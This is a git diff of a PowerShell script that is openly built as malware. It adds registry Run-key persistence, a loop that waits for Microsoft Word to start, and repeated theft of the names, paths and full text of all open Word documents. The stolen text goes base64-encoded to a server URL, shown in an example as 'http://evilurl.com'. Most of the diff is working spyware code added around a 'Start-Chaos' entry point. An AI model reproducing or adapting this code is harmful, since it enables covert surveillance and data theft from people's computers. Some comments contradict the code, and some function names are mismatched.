@@ -1,5 +1,7 @@
 $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $ServerURL = "http://localhost:8080"
+$Process = "Winword"
+
 
 function Set-RegistryPersistence {
 <#
@@ -50,12 +52,13 @@ Remove-LocalSecurityPolicy -Name "EntryToDelete".
      
 }
 
+
 function Get-OpenWORDDocumentsWords {
 <#
 .SYNOPSIS
 Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
 .EXAMPLE
-Get-OpenWordDocumentsWords
+Get-OpenWordDocumentsWords -URL "http://evilurl.com"
 .PARAMETER URL
 Indicates the URL of the server to exfiltrate the data.
 #>
@@ -71,12 +74,11 @@ Indicates the URL of the server to exfiltrate the data.
         $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
     }
     catch {
-
     }
     finally {
         foreach ($WordDoc in $WordDocuments.Documents) {
             
-            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: " + "`n"
+            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: "
                     
             foreach ($Word in $WordDoc.Words) {
                 if ($null -ne $Word.Text){
@@ -97,9 +99,10 @@ Indicates the URL of the server to exfiltrate the data.
         [Runtime.Interopservices.Marshal]::ReleaseComObject('Word.Application')
     }
     catch {
-
     }
+
 }
+
 
 function Invoke-Request {
 <#
@@ -127,8 +130,77 @@ Invoke-Request -URL "ServerURL".
 
     )
 
-    Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body
+    try {
+        Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body
+    }
+    catch{
+    }
 
 }
 
-Get-OpenWORDDocumentsWords -URL $ServerURL
+
+function Wait-ProccessStarts {
+<#
+.SYNOPSIS
+Wait until Get-Process returns a value for the indicated process name.
+.PARAMETER Process
+Indicates the process to check in Get-Process cmdlet.
+.EXAMPLE
+Wait-ProcessStarts -Process "ProcessName"
+#>
+    
+    Param (
+        [Parameter(Mandatory = $true)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Process
+    )
+
+    do {
+        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
+        # Sleep 5 secs to not overload CPU
+        Start-Sleep 1
+    } until ($Null -ne $Proc)
+    
+    Wait-ProccessStops -Process $Process
+
+}
+
+
+function Wait-ProccessStops {
+<#
+.SYNOPSIS
+Wait until Get-Process returns a $null value for the indicated process name.
+.PARAMETER Process
+Indicates the process to check in Get-Process cmdlet.
+.EXAMPLE
+Wait-ProcessStops -Process "ProcessName"
+#>
+        
+    Param (
+        [Parameter(Mandatory = $true)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Process
+    )
+
+    do {
+        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
+        # Sleep 60 sec to not overload CPU and exfiltrate documents with this time interval
+        Start-Sleep 5
+        # Execute the exiltration
+        Get-OpenWordDocumentsWords -URL $ServerURL
+    } until($Null -eq $Proc)
+
+    Wait-ProccessStarts -Process $Process
+    
+}
+
+function Start-Chaos {
+
+    Set-RegistryPersistence -Name "test" -Command "powershell.exe"
+    Wait-ProccessStarts -Process $Process
+
+}
+
+Start-Chaos
